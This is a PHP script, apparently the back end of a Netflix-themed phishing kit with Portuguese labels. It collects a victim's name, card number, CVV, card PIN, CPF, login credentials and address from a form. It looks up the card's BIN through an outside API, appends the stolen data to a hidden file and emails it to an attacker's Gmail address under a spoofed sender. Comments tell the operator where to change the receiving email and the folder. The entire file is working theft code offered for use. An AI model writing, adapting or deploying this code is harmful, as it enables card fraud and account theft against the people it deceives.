<?php

function BinChecker($binchk){

$url = "https://bins-su-api.vercel.app/api/".$binchk;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch,CURLOPT_ENCODING, "");
curl_setopt($ch,CURLOPT_MAXREDIRS, 10);
curl_setopt($ch,CURLOPT_TIMEOUT, 30);
curl_setopt($ch,CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
curl_setopt($ch,CURLOPT_CUSTOMREQUEST, "GET");

$resp = curl_exec($ch);
$data=json_decode($resp,true);
$bank = $data['data']['bin'];
$vendor =  $data['data']['vendor'];
$type =  $data['data']['type'];
$level =  $data['data']['level'];
$bank =  $data['data']['bank'];
$country =  $data['data']['country'];

if($data['data']){
$reposta_bin="Bin: $binchk | Nivel: $level | Tipo: $type | Bandeira: $vendor | Banco: $bank | Pais: $country";
return $reposta_bin;
}
else
{
echo "O CC por ser invalido ou o BinChieker errou!";
}
}

$nome_completo=$_POST["nome_completo"];
$num_cartao=$_POST["num_cartao"];
$cpf=$_POST["cpf"];
$data_vencimento=$_POST["data_vencimento"];
$cvc=$_POST["cvc"];
$senha=$_POST["senha"];
$usuario=$_POST["usuario"];
$UserSenha=$_POST["UserSenha"];
$endereco_completo=$_POST["endereco_completo"];
$Cidade=$_POST["Cidade"];
$Estado=$_POST["Estado"];
$CEP=$_POST["CEP"];

$source=$num_cartao;
$removido=str_replace(" ","",$source);
$bin_pronta = substr($removido,0,6);
$dados_cartao = BinChecker($bin_pronta);

$msg="

------------ Login ----------------------------
Usuario..................: $usuario
Senha do usuario.........: $UserSenha
-----------------------------------------------
------------ Enredeço -------------------------
Endereco completo........: $endereco_completo
Cidade...................: $Cidade
Estado...................: $Estado
CEP......................: $CEP
------------ Dados da vitima-------------------
Nome Completo............: $nome_completo
Numero do cartao com BIN.: $num_cartao - $dados_cartao
Numero do CPF............: $cpf
data de vencimento.......: $data_vencimento
CVV......................: $cvc
Senha cartao.............: $senha
-----------------------------------------------\n\n";



define("EMAIL_CLIENT", "drtech@gmail.com"); /*altere aqui o email de receber as infos*/
define("TITLE", "MAIS UMA NETFLIX");
define("SUBJECT_INBOX", TITLE." 2.0 -  NOVA");
define("CONTENT_MESSAGE", $msg);
define("HEADERS_OF_EMAIL", "MIME-Version: 1.0\nContent-Type: text/html; charset=UTF-8\r\nFrom: ".TITLE." <xuxuca@myrella.com.br>\nX-Priority: 1 (Highest)\nX-MSMail-Priority: High\nImportance: High\n");


$dir_infos="JHAKHUHIUHAKHKHUIUHAHKJHKAHKJAYUYAKJAHKJJAHKJHKJJA"; /*altere aqui a ppasta de destino das infos*/
$today = date("d-M-Y_H-i-s");
$myFile ="$dir_infos"."/"."NETFLIX.txt";
$fh = fopen($myFile, 'a') or die("Nao pude abrir o seu arquivo...");
$stringData =$msg;
fwrite($fh, $stringData);
fclose($fh);

mail(EMAIL_CLIENT, SUBJECT_INBOX, CONTENT_MESSAGE, HEADERS_OF_EMAIL);
?>
